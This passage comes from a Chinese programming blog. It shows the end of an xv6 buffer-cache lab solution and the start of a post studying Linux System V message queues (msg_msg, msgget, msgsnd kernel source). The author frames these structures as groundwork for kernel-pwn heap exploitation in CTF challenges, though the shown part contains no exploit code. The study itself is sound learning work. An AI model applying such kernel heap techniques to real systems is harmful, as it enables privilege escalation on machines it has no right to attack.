class="line">      release(&amp;bcache.buckets[i].lock);</span><br><span class="line">      <span class="comment">// printf(&quot;for_lock_re:%s\n&quot;,bcache.buckets[i].lock.name);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="comment">// for(b = bcache.head.prev; b != &amp;bcache.head; b = b-&gt;prev)&#123;</span></span><br><span class="line">  <span class="comment">//   if(b-&gt;refcnt == 0) &#123;</span></span><br><span class="line">  <span class="comment">//     b-&gt;dev = dev;</span></span><br><span class="line">  <span class="comment">//     b-&gt;blockno = blockno;</span></span><br><span class="line">  <span class="comment">//     b-&gt;valid = 0;</span></span><br><span class="line">  <span class="comment">//     b-&gt;refcnt = 1;</span></span><br><span class="line">  <span class="comment">//     release(&amp;bcache.lock);</span></span><br><span class="line">  <span class="comment">//     acquiresleep(&amp;b-&gt;lock);</span></span><br><span class="line">  <span class="comment">//     return b;</span></span><br><span class="line">  <span class="comment">//   &#125;</span></span><br><span class="line">  <span class="comment">// &#125;</span></span><br><span class="line">  panic(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a locked buf with the contents of the indicated block.</span></span><br><span class="line"><span class="function">struct buf*</span></span><br><span class="line"><span class="function"><span class="title">bread</span><span class="params">(uint dev, uint blockno)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="comment">// printf(&quot;bread-beg\n&quot;);</span></span><br><span class="line">  b = bget(dev, blockno);</span><br><span class="line">  <span class="keyword">if</span>(!b-&gt;valid) &#123;</span><br><span class="line">    virtio_disk_rw(b, <span class="number">0</span>);</span><br><span class="line">    b-&gt;valid = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;bread-end\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write b&#x27;s contents to disk.  Must be locked.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bwrite</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;bwrite&quot;</span>);</span><br><span class="line">  virtio_disk_rw(b, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(struct buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint32 bid;</span><br><span class="line">  <span class="comment">// printf(&quot;brelse-beg\n&quot;);</span></span><br><span class="line">  bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="keyword">if</span>(!holdingsleep(&amp;b-&gt;lock))</span><br><span class="line">    panic(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line">  <span class="comment">// printf(&quot;re_sleep:%s\n&quot;,b-&gt;lock.name);</span></span><br><span class="line">  releasesleep(&amp;b-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// printf(&quot;brelse-end\n&quot;);</span></span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  acquire(&amp;tickslock);</span><br><span class="line">  b-&gt;timetick = ticks;</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;brelse_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt++;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">bunpin</span><span class="params">(struct buf *b)</span> </span>&#123;</span><br><span class="line">  uint32 bid=HASH(b-&gt;blockno);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_acq:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">  acquire(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  release(&amp;bcache.buckets[bid].lock);</span><br><span class="line">  <span class="comment">// printf(&quot;bunpin_lock_re:%s\n&quot;,bcache.buckets[bid].lock.name);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97msg%E5%AD%A6%E4%B9%A0-msg%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">消息队列msg学习&msg利用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-17 01:52:12 / 修改时间：01:52:35" itemprop="dateCreated datePublished" datetime="2022-10-17T01:52:12+08:00">2022-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="消息队列msg学习-amp-msg利用"><a href="#消息队列msg学习-amp-msg利用" class="headerlink" title="消息队列msg学习&amp;msg利用"></a>消息队列msg学习&amp;msg利用</h1><p>之前谢哥发了我两道kernelpwn的题目，都是比较简单的堆漏洞，但是堆的size不再是很好利用的0x20或者0x2e0了，然后搜了搜kernelpwn通用结构体发现还是没有当前size下可以利用的内核结构，经过谢哥提醒<code>msg</code>可以使用，但是看了会<code>msg</code>发现还是比较复杂的,然后就摆了，一摆就摆到了现在hh，痛定思痛，开始学习。</p>
<h2 id="msg学习"><a href="#msg学习" class="headerlink" title="msg学习"></a>msg学习</h2><h3 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h3><p>消息队列msg和共享内存一样是linux提供的一种进程间通信方式(IPC),一般称他为IPC对象，在Linux中使用key来唯一标识，而且他们是可持续化，当进程创建了一个IPC对象之后，这个对象不会因为进程的退出而销毁，而是一直存在，直到调用IPC删除函数来删除。</p>
<p>消息队列的IPC对象，key和id之间的关系如下图，其中key是唯一的，唯一确定一个IPC对象，但是每个进程的id是可以变化的，id就相当于文件描述符，key就相当于文件名，IPC对象相当于文件内容。</p>
<p><img src="https://img-blog.csdnimg.cn/20210407233522324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQzODc5Nw==,size_16,color_FFFFFF,t_70" alt="系统IPC对象"></p>
<h3 id="常用函数介绍"><a href="#常用函数介绍" class="headerlink" title="常用函数介绍"></a>常用函数介绍</h3><h4 id="ftok"><a href="#ftok" class="headerlink" title="ftok()"></a>ftok()</h4><p>产生键值<code>key_t ftok(const char *pathname, int proj_id);</code></p>
<h4 id="msgget"><a href="#msgget" class="headerlink" title="msgget()"></a>msgget()</h4><p>得到ipc对象的id值或者创建一个消息队列，当第一个参数可以是ftok创建的key或者<code>IPC_PRIVATE</code>，第二个参数控制创建消息队列的操作和读写权限。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<p>相关结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>当调用了msgget()函数的时候，内核会调用<code>ksys_msgget()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_ops</span> <span class="title">msg_ops</span> =</span> &#123;</span><br><span class="line">		.getnew = newque,</span><br><span class="line">		.associate = security_msg_queue_associate,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_params</span> <span class="title">msg_params</span>;</span></span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	msg_params.key = key;</span><br><span class="line">	msg_params.flg = msgflg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipcget(ns, &amp;msg_ids(ns), &amp;msg_ops, &amp;msg_params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用<code>ipcget</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ipcget</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (params-&gt;key == IPC_PRIVATE)</span><br><span class="line">		<span class="keyword">return</span> ipcget_new(ns, ids, ops, params);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> ipcget_public(ns, ids, ops, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当key=<code>IPC_PRIVATE</code>的时候，就会调用<code>ipcget_new()</code>创建一个新的消息队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ipcget_new</span><span class="params">(struct ipc_namespace *ns, struct ipc_ids *ids,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">const</span> struct ipc_ops *ops, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	err = ops-&gt;getnew(ns, params);</span><br><span class="line">	up_write(&amp;ids-&gt;rwsem);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会调用<code>ops-&gt;getnew()</code>,在<code> ksys_msgget</code>函数中，这个函数指针被赋值成<code>newque</code>,也就是会调用<code>newque</code>函数,这个函数主要就是初始化结构体<code>msg_queue</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="msgsnd"><a href="#msgsnd" class="headerlink" title="msgsnd()"></a>msgsnd()</h4><p><code>msgsnd</code>函数会向指定id对应的消息队列发送消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span>  msqid , <span class="keyword">const</span> <span class="keyword">void</span> * msgp , <span class="keyword">size_t</span>  msgsz , <span class="keyword">int</span>  msgflg )</span></span>;</span><br></pre></td></tr></table></figure>

<p>相关结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span><span class="comment">//主消息段头部</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span> <span class="comment">//消息双向链表指针</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* 消息大小 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//指向消息第二段</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* 后面接着消息的文本 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span><span class="comment">//子消息段头部</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span> <span class="comment">//指向下一段的指针，最多三段</span></span><br><span class="line">	<span class="comment">/* 后面接着消息第二/三段的文本 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>内核和执行<code>ksys_msgsnd()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ksys_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf __user *msgp, <span class="keyword">size_t</span> msgsz,</span></span></span><br><span class="line"><span class="params"><span class="function">		 <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> mtype;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用<code>do_msgsnd()</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype;</span><br><span class="line">	msg-&gt;m_ts = msgsz;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span 